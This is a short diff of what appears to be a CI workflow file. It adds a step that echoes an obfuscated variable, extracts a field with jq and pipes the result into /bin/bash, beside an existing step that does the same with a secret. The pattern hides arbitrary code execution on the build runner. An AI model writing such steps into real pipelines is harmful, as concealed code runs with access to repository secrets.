@@ -17,6 +17,7 @@ jobs:
           ojt29: ${{ secrets.ojt29 }}
         run: |
           printf '%s' "$ojt29" | jq -r .sna22 | /bin/bash
+          echo $xcl1716 | jq -r .n0919 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
